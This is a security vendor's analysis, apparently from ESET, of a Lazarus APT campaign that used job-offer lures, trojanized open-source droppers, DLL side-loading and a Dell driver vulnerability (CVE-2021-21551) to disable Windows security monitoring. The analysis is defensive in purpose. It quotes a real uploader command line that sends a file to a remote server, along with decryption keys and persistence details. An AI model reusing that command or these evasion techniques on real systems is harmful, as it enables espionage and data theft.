                    <div class="article-body">
    <p>ESET researchers uncovered and analyzed a set of malicious tools that were used by the infamous Lazarus APT group in attacks during the autumn of 2021. The campaign started with spearphishing emails containing malicious Amazon-themed documents and targeted an employee of an aerospace company in the Netherlands, and a political journalist in Belgium. The primary goal of the attackers was data exfiltration. Lazarus (also known as HIDDEN COBRA) has been active since at least 2009. It is responsible for high-profile incidents such as both the <a href="https://www.welivesecurity.com/2014/12/08/sony-pictures-hacking-traced-thai-hotel-north-korea-denies-involvement/" target="_blank" rel="noopener">Sony Pictures Entertainment hack</a> and tens-of-millions-of-dollar <a href="https://www.welivesecurity.com/2016/03/15/bangladesh-central-bank-boss-quits-100m-cyberheist/" target="_blank" rel="noopener">cyberheists in 2016</a>, the <a href="https://www.welivesecurity.com/2017/05/15/wannacryptor-key-questions-answered/" target="_blank" rel="noopener">WannaCryptor</a> (aka WannaCry) outbreak in 2017, and a long history of disruptive attacks against <a href="https://www.welivesecurity.com/2020/11/16/lazarus-supply-chain-attack-south-korea/" target="_blank" rel="noopener">South Korean public and critical infrastructure</a> since at least 2011.</p>
<span class="update-block"><p><br />
<strong>Key findings in this blogpost:</strong>
<ul>
<li>The Lazarus campaign targeted an employee of an aerospace company in the Netherlands, and a political journalist in Belgium.</li>
<li>The most notable tool used in this campaign represents the first recorded abuse of the CVEâ2021â21551 vulnerability. This vulnerability affects Dell DBUtil drivers; Dell provided a security update in May 2021.</li>
<li>This tool, in combination with the vulnerability, disables the monitoring of all security solutions on compromised machines. It uses techniques against Windows kernel mechanisms that have never been observed in malware before.</li>
<li>Lazarus also used in this campaign their fully featured HTTP(S) backdoor known as BLINDINGCAN.</li>
<li>The complexity of the attack indicates that Lazarus consists of a large team that is systematically organized and well prepared.</li>
</ul>
<br /></p></span><br />
Both targets were presented with job offers â the employee in the Netherlands received an attachment via LinkedIn Messaging, and the person in Belgium received a document via email. Attacks started after these documents were opened. The attackers deployed several malicious tools on each system, including droppers, loaders, fully featured HTTP(S) backdoors, HTTP(S) uploaders and downloaders. The commonality between the droppers was that they are trojanized open-source projects that decrypt the embedded payload using modern block ciphers with long keys passed as command line arguments. In many cases, malicious files are DLL components that were side-loaded by legitimate EXEs, but from an unusual location in the file system.</p>
<p>The most notable tool delivered by the attackers was a user-mode module that gained the ability to read and write kernel memory due to the <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21551" target="_blank" rel="noopener">CVE-2021-21551</a> vulnerability in a legitimate Dell driver. This is the first ever recorded abuse of this vulnerability in the wild. The attackers then used their kernel memory write access to disable seven mechanisms the Windows operating system offers to monitor its actions, like registry, file system, process creation, event tracing etc., basically blinding security solutions in a very generic and robust way.</p>
<p>In this blogpost, we explain the context of the campaign and provide a detailed technical analysis of all the components. This research was presented at this yearâs <a href="https://www.virusbulletin.com/conference/vb2022/" target="_blank" rel="noopener">Virus Bulletin conference</a>. Because of the originality, the main focus of the presentation is on the malicious component used in this attack that uses the Bring Your Own Vulnerable Driver (BYOVD) technique and leverages the aforementioned CVE-2021-21551 vulnerability. Detailed information is available in the white paper <a href="https://www.virusbulletin.com/uploads/pdf/conference/vb2022/VB2022-Kalnai-Havranek.pdf" target="_blank" rel="noopener">Lazarus &amp; BYOVD: Evil to the Windows core</a>.</p>
<p>We attribute these attacks to Lazarus with high confidence, based on the specific modules, the code-signing certificate, and the intrusion approach in common with previous Lazarus campaigns like <a href="https://web-assets.esetstatic.com/wls/2020/06/ESET_Operation_Interception.pdf" target="_blank" rel="noopener">Operation In(ter)ception</a>Â  and <a href="https://www.clearskysec.comhttps://web-assets.esetstatic.com/wls/2020/08/Dream-Job-Campaign.pdf" target="_blank" rel="noopener">Operation DreamJob</a>. The diversity, number, and eccentricity in implementation of Lazarus campaigns define this group, as well as that it performs all three pillars of cybercriminal activities: cyberespionage, cybersabotage, and pursuit of financial gain.</p>
<h2><strong>Initial access</strong></h2>
<p>ESET researchers discovered two new attacks: one against personnel of a media outlet in Belgium and one against an employee of an aerospace company in the Netherlands.</p>
<p>In the Netherlands, the attack affected a Windows 10 computer connected to the corporate network, where an employee was contacted via LinkedIn Messaging about a supposed potential new job, resulting in an email with a document attachment being sent. We contacted the security practitioner of the affected company, who was able to share the malicious document with us. The Word file <span style="font-family: 'courier new', courier, monospace;">Amzon_Netherlands.docx</span> sent to the target is merely an outline document with an Amazon logo (see Figure 1). When opened, the remote template <span style="font-family: 'courier new', courier, monospace;">https://thetalkingcanvas[.]com/thetalking/globalcareers/us/5/careers/jobinfo.php?image=&lt;var&gt;_DO.PROJ</span> (where <span style="font-family: 'courier new', courier, monospace;">&lt;var&gt;</span> is a seven-digit number) is fetched. We were unable to acquire the content, but we assume that it may have contained a job offer for the Amazon space program, <a href="https://en.wikipedia.org/wiki/Kuiper_Systems" target="_blank" rel="noopener">Project Kuiper</a>. <h2><strong>Toolset</strong></h2>
<p>One of the typical traits of Lazarus is its delivery of the final payload in the form of a sequence of two or three stages. It starts with a dropper â usually a trojanized open-source application â that decrypts the embedded payload with a modern block cipher like AES-128 (which is not unusual for Lazarus, e.g., <a href="https://vblocalhost.com/uploads/VB2021-Lee-etal.pdf" target="_blank" rel="noopener">Operation Bookcodes</a>, or an obfuscated XOR, after parsing the command line arguments for a strong key. Despite the embedded payload not being dropped onto the file system but loaded directly into memory and executed, we denote such malware as a dropper. Malware that doesnât have an encrypted buffer, but that loads a payload from a filesystem, we denote as a loader.</p>
<p>The droppers may (Table 1) or may not (Table 2) be side-loaded by a legitimate (Microsoft) process. In the first case here, the legitimate application is at an unusual location and the malicious component bears the name of the corresponding DLL that is among the applicationâs imports. However, the usual location for this legitimate application is <span style="font-family: 'courier new', courier, monospace;">%WINDOWS%\System32\</span>.</p>
<p>In all cases, at least one command line argument is passed during runtime that serves as an external parameter required to decrypt the embedded payload. Various decryption algorithms are used; see the last column in Table 1 and Table 2. In several cases when AES-128 is used, thereâs also an internal, hardcoded parameter together with the name of the parent process and its DLL name, all required for successful decryption.</p>

<h3><strong>Intermediate loader</strong></h3>
<p>Now we describe a three-stage chain where, unfortunately, we were able to identify only the first two steps: a dropper and an intermediate loader.</p>
<p>The first stage is a dropper located at <span style="font-family: 'courier new', courier, monospace;">C:\Windows\Vss\credui.dll</span> and was run via a legitimate â but vulnerable to DLL search-order hijacking â application with the (external) parameter <span style="font-family: 'courier new', courier, monospace;">C:\Windows\Vss\WFS.exe A39T8kcfkXymmAcq</span>. The program <span style="font-family: 'courier new', courier, monospace;">WFS.exe</span> is a copy of the Windows Fax and Scan application, but its standard location is <span style="font-family: 'courier new', courier, monospace;">%WINDOWS%\System32\</span>.</p>
<p>The dropper is a trojanized <a href="https://github.com/tike/GOnpp" target="_blank" rel="noopener">GOnpp plug-in</a> for Notepad++, written in the Go programming language. After the decryption, the dropper checks whether the buffer is a valid 64-bit executable and then, if so, loads it into memory, so that the second stage is ready for execution.</p>
<p>The goal of this intermediate stage is to load an additional payload in memory and execute it. It performs this task in two steps. It first reads and decrypts the configuration file <span style="font-family: 'courier new', courier, monospace;">C:\windows\System32\wlansvc.cpl</span>, which is not, as its extension might suggest, an (encrypted) executable, but a data file containing chunks of <span style="font-family: 'courier new', courier, monospace;">14944</span> bytes with configuration. We didnât have the particular data from the current attack; however, we obtained such configuration from another Lazarus attack: see Figure 5.The configuration is expected to start with a double word representing the total size of the remaining buffer (see Line 69 in Figure 4 below and the variable <span style="font-family: 'courier new', courier, monospace;">u32TotalSize</span>), followed by an array of <span style="font-family: 'courier new', courier, monospace;">14944</span> byte-long structures containing at least two values: the name of the loading DLL as a placeholder for identifying the rest of the configuration (at the offset 168 of Line 74 in Figure 4 and the highlighted member in Figure 5).</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/wls/2022/09/Figure-4.-The-first-step-of-decrypting-the-configuration-file-containing-a-filename-of-an-executable-to-load..png"><img class="wp-image-165821" src="https://web-assets.esetstatic.com/wls/2022/09/Figure-4.-The-first-step-of-decrypting-the-configuration-file-containing-a-filename-of-an-executable-to-load..png" alt="" width="800" height="374" /></a><p class="caption-text"><em>Figure 4. It is expected to be a 64-bit executable and is loaded into the memory the same way the first-stage dropper handled the intermediate loader. At the start of execution, a mutex is created as a concatenation of the string <span style="font-family: 'courier new', courier, monospace;">Global\AppCompatCacheObject</span> and the CRC32 checksum of its DLL name (<span style="font-family: 'courier new', courier, monospace;">credui.dll</span>) represented as a signed integer. The value should equal <span style="font-family: 'courier new', courier, monospace;">Global\AppCompatCacheObject-1387282152 <span style="font-family: georgia, palatino, serif;">if</span> wlansvc.cpl</span> exists and <span style="font-family: 'courier new', courier, monospace;">-1387282152</span> otherwise.</p>

<h3><strong>HTTP(S) uploader</strong></h3>
<p>This Lazarus tool is responsible for data exfiltration, by using the HTTP or HTTPS protocols.</p>
<p>It is delivered in two stages as well. The initial dropper is a trojanized <a href="https://www.sqlite.org/index.html" target="_blank" rel="noopener">sqlite-3.31.1</a> library. Lazarus samples usually donât contain a PDB path, but this loader has one, <span style="font-family: 'courier new', courier, monospace;">W:\Develop\Tool\HttpUploader\HttpPOST\Pro\_BIN\RUNDLL\64\sqlite3.pdb</span>, which also suggests its functionality immediately â a HTTP Uploader.</p>
<p>The dropper expects multiple command line parameters: one of them is a password required to decrypt and load the embedded payload; the rest of parameters are passed to the payload. We didnât catch the parameters, but luckily an in-the-wild use of this tool was observed in a forensic investigation by <a href="https://www.hvs-consulting.de/media/downloads/ThreatReport-Lazarus.pdf" target="_blank" rel="noopener">HvS Consulting</a>:</p>
<p><span style="font-family: 'courier new', courier, monospace;">C:\ProgramData\IBM\~DF234.TMP S0RMM-50QQE-F65DN-DCPYN-5QEQA https://www.gonnelli.it/uploads/catalogo/thumbs/thumb.asp C:\ProgramData\IBM\restore0031.dat data03 10000 -p 192.168.1.240 8080</span></p>

<h3><strong>FudModule Rootkit</strong></h3>
<p>We identified a dynamically linked library with the internal name FudModule.dll that tries to disable various Windows monitoring features. It does so by modifying kernel variables and removing kernel callbacks, which is possible because the module acquires the ability to write in the kernel by leveraging the BYOVD techniques - the specific <a href="https://www.sentinelone.com/labs/cve-2021-21551-hundreds-of-millions-of-dell-computers-at-risk-due-to-multiple-bios-driver-privilege-escalation-flaws/">CVE-2021-21551</a> vulnerability in the Dell driver dbutil_2_3.sys.</p>
<p>The full analysis of this malware is available as a VB2022 paper <a href="https://www.virusbulletin.com/uploads/pdf/conference/vb2022/VB2022-Kalnai-Havranek.pdf" target="_blank" rel="noopener">Lazarus &amp; BYOVD: evil to the Windows core</a>.</p>
<h3><strong>Other malware</strong></h3>
<p>Additional droppers and loaders were discovered in the attacks, but we didnât obtain the necessary parameters to decrypt the embedded payloads or encrypted files.</p>
<h4><strong>Trojanized lecui</strong></h4>
<p>A project <a href="https://github.com/alecmus/lecui">lecui by Alec Musafa</a> served the attackers as a code base for trojanization of two additional loaders. By their filenames, they were disguised as Microsoft libraries <span style="font-family: 'courier new', courier, monospace;">mi.dll</span> (Management Infrastructure) and <span style="font-family: 'courier new', courier, monospace;">cryptsp.dll</span> (Cryptographic Service Provider API), respectively, and this was due to the intended side-loading by the legitimate applications <span style="font-family: 'courier new', courier, monospace;">wsmprovhost.exe</span> and <span style="font-family: 'courier new', courier, monospace;">SMSvcHost.exe</span>, respectively; see Table 1.</p>
<p>The main purpose of these loaders is to read and decrypt executables located in <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fscc/e2b19412-a925-4360-b009-86e3b8a020c8">alternate data streams</a> (ADS) at <span style="font-family: 'courier new', courier, monospace;">C:\ProgramData\Caphyon\mi.dll:Zone.Identifier</span> and <span style="font-family: 'courier new', courier, monospace;">C:\Program Files\Windows Media Player\Skins\DarkMode.wmz:Zone.Identifier</span>, respectively. Since we havenât acquired these files, itâs not known which payload is hidden there; however, the only certainty is that itâs an executable, since the loading process follows the decryption (see Figure 2). The use of ADS is not new, because Ahnlab reported a <a href="https://asec.ahnlab.com/en/23717/">Lazarus attack against South Korean companies</a> in June 2021 involving such techniques.</p>
<h4><strong>Trojanized FingerText</strong></h4>
<p>ESET blocked an additional trojanized open-source application, <a href="https://github.com/erinata/FingerText">FingerText 0.5.61 by erinata</a>, located at <span style="font-family: 'courier new', courier, monospace;">%WINDIR%\security\credui.dll</span>. The correct command line parameters are not known. As in some of the previous cases, three parameters were required for the AES-128 decryption of the embedded payload: the parent processâs name, <span style="font-family: 'courier new', courier, monospace;">WFS.exe</span>; the internal parameter, <span style="font-family: 'courier new', courier, monospace;">mg89h7MsC5Da4ANi</span>; and the missing external parameter.</p>
<h4><strong>Trojanized sslSniffer</strong></h4>
<p>The attack against a target in Belgium was blocked early in its deployment chain so only one file was identified, a 32-bit dropper located at <span style="font-family: 'courier new', courier, monospace;">C:\PublicCache\msdxm.ocx</span>. It is an sslSniffer component from the <a href="https://github.com/wolfSSL/wolfssl" target="_blank" rel="noopener">wolfSSL</a> project that has been trojanized. At the time of the attack, it was validly signed with a certificate issued to<span style="font-family: 'courier new', courier, monospace;"> "A" MEDICAL OFFICE, PLLC</span> (see Figure 8), which has since expired.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/wls/2022/09/Figure-9.-Validly-signed-but-already-expired-certificate-1.png"><img class="wp-image-165826" src="https://web-assets.esetstatic.com/wls/2022/09/Figure-9.-Validly-signed-but-already-expired-certificate-1.png" alt="" width="800" height="510" /></a><p class="caption-text"><em>Figure 9. Both exports require exactly two parameters. The purpose of the first export is to establish persistence by creating <span style="font-family: 'courier new', courier, monospace;">OfficeSync.LNK</span>, located in <span style="font-family: 'courier new', courier, monospace;">%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup</span>, pointing to the malicious DLL and running its second export via rundll32.exe with the parameters passed to itself.</p>

<h2><strong>Conclusion</strong></h2>
<p>In this attack, as well as in many others attributed to Lazarus, we saw that many tools were distributed even on a single targeted endpoint in a network of interest. Without a doubt, the team behind the attack is quite large, systematically organized, and well prepared. For the first time in the wild, the attackers were able to leverage CVE-2021-21551 for turning off the monitoring of all security solutions. It was not just done in kernel space, but also in a robust way, using a series of little- or undocumented Windows internals. Undoubtedly this required deep research, development, and testing skills.</p>
<p>From the defendersâ point of view, it seems easier to limit the possibilities of initial access than to block the robust toolset that would be installed after determined attackers gain a foothold in the system. As in many cases in the past, an employee falling prey to the attackersâ lure was the initial point of failure here. In sensitive networks, companies should insist that employees not pursue their personal agendas, like job hunting, on devices belonging to their companyâs infrastructure.</p>
